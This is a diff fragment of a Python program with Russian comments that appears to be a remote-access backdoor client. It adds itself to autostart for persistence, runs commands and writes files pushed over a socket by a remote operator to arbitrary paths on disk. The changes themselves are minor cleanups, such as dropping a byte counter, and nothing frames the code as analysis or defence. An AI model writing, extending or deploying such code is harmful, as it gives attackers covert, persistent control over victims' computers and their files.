@@ -17,12 +17,11 @@ def execute_command(command):
 def is_windows():
     return os.name == 'nt'
 
-# Если у вас есть функции автозапуска — вставьте их сюда.
-# Ниже пропуск символом ... (оставьте ваши функции автозапуска неизменными).
+# ... (автозагрузка и другие функции остались без изменений) ...
 
 def main():
     try:
-        add_self_to_autostart()  # добавьте вашу функцию автозапуска или оставьте вызов пустым
+        add_self_to_autostart()
     except Exception as e:
         print(f"Ошибка добавления в автозапуск: {e}")
 
@@ -163,15 +162,14 @@ def main():
                     filepath = command[len("upload:"):].strip()
                     try:
                         with open(filepath, "wb") as f:
-                            total_received = 0
                             while True:
                                 chunk = s.recv(BUFFER_SIZE)
                                 if chunk == b"__file_transfer_end__" or not chunk:
                                     break
                                 f.write(chunk)
-                                total_received += len(chunk)
+                        # Отправляем подтверждение успешного получения файла
                         s.send(f"Файл {os.path.basename(filepath)} успешно получен.\n".encode())
-                        print(f"[INFO] Файл {filepath} успешно сохранён, размер: {total_received} байт")
+                        print(f"[INFO] Файл {filepath} успешно сохранён")
                     except Exception as e:
                         s.send(f"Ошибка при сохранении файла: {e}".encode())
                         print(f"[ERROR] Ошибка при сохранении файла: {e}")
